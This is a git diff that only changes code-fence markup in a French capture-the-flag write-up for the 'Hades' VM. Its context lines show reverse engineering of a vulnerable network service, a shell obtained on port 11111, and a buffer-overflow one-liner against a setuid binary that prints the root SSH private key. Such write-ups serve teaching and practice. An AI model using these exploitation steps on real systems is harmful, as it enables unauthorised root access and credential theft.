@@ -29,7 +29,7 @@ Knockin' on Hell's Door
 
 Un scan de port TCP retourne deux ports ouverts dont l'un non-identifié :  
 
-```plain
+```
 Nmap scan report for 192.168.1.53
 Host is up (0.00016s latency).
 Not shown: 999 closed ports
@@ -73,7 +73,7 @@ Loki's playing tricks again
 
 Lorsque l'on se connecte au port 65535 avec ncat, on voit que l'on a affaire à un programme home-made dont l'invite est la suivante :  
 
-```plain
+```
 Welcome to the jungle.
 Enter up to two commands of less than 121 characters each.
 ```
@@ -111,7 +111,7 @@ fd.close()
 
 Devinez quoi... le fichier s'avère être un binaire ELF :  
 
-```plain
+```
 ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
 dynamically linked (uses shared libs), for GNU/Linux 2.6.26,
 BuildID[sha1]=d241bcc0f0d75412c3fe834dd345732b59075c50, not stripped
@@ -119,7 +119,7 @@ BuildID[sha1]=d241bcc0f0d75412c3fe834dd345732b59075c50, not stripped
 
 Et si on fait un *strings*, qu'est-ce que l'on obtient ?  
 
-```plain
+```
 /lib/ld-linux.so.2
 Es+Y
 __gmon_start__
@@ -156,7 +156,7 @@ C'est bien le binaire derrière le port 65535 et il n'est pas strippé !
 
 Jetons un coup d’œil avec *Radare2* :  
 
-```plain
+```
 $ radare2 loki_server 
  -- Use 'e' and 't' in Visual mode to edit configuration and track flags
 [0x080485a0]> aa
@@ -240,7 +240,7 @@ On remarque aussi qu'il alloue 121 octets (0x79) sur le tas au tout début du pr
 
 Il saute ensuite sur cette partie de code :  
 
-```plain
+```
 [0x080485a0]> pdf@0x80489b1
 / (fcn) fcn.08048855 384
 | .-------> 0x08048855    c7442404790. mov dword [esp+0x4], 0x79 ;  0x00000079 
@@ -352,7 +352,7 @@ Des recopie sont faites différemment en fonction de sa valeur mais après calcu
 
 Regardons plutôt la fonction *v2* qui est appelée pour la seconde commande :  
 
-```plain
+```
 [0x080485a0]> pdf@sym.v2
 |          ; CODE (CALL) XREF from 0x080489a4 (fcn.08048855)
 / (fcn) sym.v2 38
@@ -400,7 +400,7 @@ print "done"
 
 Dans gdb on obtient ceci :  
 
-```plain
+```
 Program received signal SIGSEGV, Segmentation fault.
 0x43434343 in ?? ()
 (gdb) info reg
@@ -437,7 +437,7 @@ Evidemment il faut relancer la VM à chaque tentative. Malheureusement... ça n'
 
 Voyons voir ce que ce programme a d'autre dans le ventre :  
 
-```plain
+```
 $ nm loki_server
          U accept@@GLIBC_2.0
          U bind@@GLIBC_2.0
@@ -459,7 +459,7 @@ Intéressant ! En plus de la fonction vulnérable *v2*, le programme a des fonct
 
 Qu'il y a t-il dans *v0* ?  
 
-```plain
+```
 [0x080485a0]> pdf@sym.v0
 / (fcn) sym.v0 13
 |          0x0804868c    55           push ebp
@@ -471,7 +471,7 @@ Qu'il y a t-il dans *v0* ?
 
 Et que trouve t'on dans esp-0x2c ? (merci gdb)  
 
-```plain
+```
 (gdb) x/s $esp-0x2c
 0xffc6dfb4:     'A' <repeats 36 times>, "BBBBCCCCDD"
 ```
@@ -515,14 +515,14 @@ print "done"
 
 Le lancement du programme lève un breakpoint dans gdb :  
 
-```plain
+```
 Program received signal SIGTRAP, Trace/breakpoint trap.
 0xfff7e165 in ?? ()
 ```
 
 On trouve notre bonheur à esp+71 :  
 
-```plain
+```
 (gdb) x/s $esp+71
 0xfff7e1ab:     "hello"
 ```
@@ -582,7 +582,7 @@ print "done"
 
 On lance l'exploit et on se connecte au port 11111 :
 
-```plain
+```
 $ ncat 192.168.1.53 11111 -v
 Ncat: Version 6.01 ( http://nmap.org/ncat )
 Ncat: Connected to 192.168.1.53:11111.
@@ -597,7 +597,7 @@ Stealing Hades key
 
 Une fois que l'on a récupéré un shell plus propre...  
 
-```plain
+```
 loki@Hades:~$ ls -al
 total 40
 drwxr-xr-x 3 loki loki 4096 Mar 19 18:59 .
@@ -618,7 +618,7 @@ Good for you and good for me.
 
 Dans la racine du système de fichier on trouve différents fichiers intéressants notamment un exécutable set-uid root et une clé en lecture pour root uniquement :  
 
-```plain
+```
 loki@Hades:/$ ls -alR display_root_ssh_key/
 display_root_ssh_key/:
 total 280
@@ -638,7 +638,7 @@ Ce programme semble aussi vulnérable à un buffer overflow et crashe si on rent
 
 Si on passe strings sur *display\_key* on trouve :  
 
-```plain
+```
 CuX(
 KH\9
 9_<v0
@@ -670,7 +670,7 @@ Par où commencer l'analyse de ce programme quand on ne sait pas où se trouve l
 
 Quand le programme tourne, en root on affiche son fichier maps (cat cat /proc/pid\_du\_programme/maps) :  
 
-```plain
+```
 00c01000-00c02000 r-xp 00000000 08:02 614773                             /tmp/display_key
 08048000-080ca000 r-xp 00000000 00:00 0 
 080ca000-080cd000 rwxp 00000000 00:00 0 
@@ -686,7 +686,7 @@ Ensuite depuis gdb on affiche les instructions (x/200i 0x08048000).
 
 Dans tout ce fatras on trouve des instructions caractéristiques d'un appel à main() :  
 
-```plain
+```
    0x8048157:   push   $0x804837b
    0x804815c:   call   0x80483f0
    0x8048161:   hlt
@@ -815,7 +815,7 @@ Notez que ce code a été écrit pour du x86. Il est loin d'être parfait (peut 
 
 Les plus courageux pourront même coupler ce code avec [Capstone](http://www.capstone-engine.org/) pour avoir un programme top-la-classe qui affiche les instructions assembleur.  
 
-```plain
+```
 $ ./call_trace display_key
 [*] mmap (90)
 [*] readlink (85)
@@ -875,7 +875,7 @@ Je n'entrerais pas dans les détails de déboguage du programme : ça s'est fait
 
 Au bout d'un moment on atterri ici :  
 
-```plain
+```
    0x804832d:	push   %ebp
    0x804832e:	mov    %esp,%ebp
    0x8048330:	sub    $0x38,%esp
@@ -902,7 +902,7 @@ Au bout d'un moment on atterri ici :
 
 Le contenu de la première fonction appelée (pour les curieux) :  
 
-```plain
+```
 => 0x8055450:	push   %ebp
    0x8055451:	xor    %edx,%edx
    0x8055453:	mov    %esp,%ebp
@@ -924,7 +924,7 @@ Le contenu de la première fonction appelée (pour les curieux) :
 
 La méthode qui gère le statut du compteur :  
 
-```plain
+```
 => 0x8048268:	push   %ebp
    0x8048269:	mov    %esp,%ebp
    0x804826b:	sub    $0x28,%esp
@@ -988,7 +988,7 @@ Dans tous les cas on voit cette fois la chaine "reboot" à l'adresse 0x80ab42c.
 
 Si on cherche les chaines autour de *reboot* :  
 
-```plain
+```
 (gdb) x/10s 0x80ab400
 0x80ab400:      "\003"
 0x80ab402:      ""
@@ -1004,7 +1004,7 @@ Si on cherche les chaines autour de *reboot* :
 
 On utilise une super fonctionnalité de gdb pour savoir si l'adresse de *"cat /root/.ssh/id\_rsa"* est utilisée dans le code :  
 
-```plain
+```
 (gdb) find /b 0x8048000,  0x8048fff, 0x08, 0xb4, 0x0a, 0x08
 0x804825d
 1 pattern found.
@@ -1020,7 +1020,7 @@ On utilise une super fonctionnalité de gdb pour savoir si l'adresse de *"cat /r
 
 On peut exploiter le buffer overflow et mettant comme adresse de retour l'adresse du *movl* :  
 
-```plain
+```
 $ python -c 'print "\x5a\x82\x04\x08"*30' | ./display_key
 
 -----BEGIN RSA PRIVATE KEY-----
@@ -1058,7 +1058,7 @@ Notez que les solutions alternatives d'exploitation sont réduites par le fait q
 
 Une connection SSH plus tard...  
 
-```plain
+```
 root@Hades:~# openssl aes-256-cbc -d -in flag.txt.enc -out agadou.txt -pass file:/key_file
 root@Hades:~# cat agadou.txt 
 Congratulations on completing Hades.
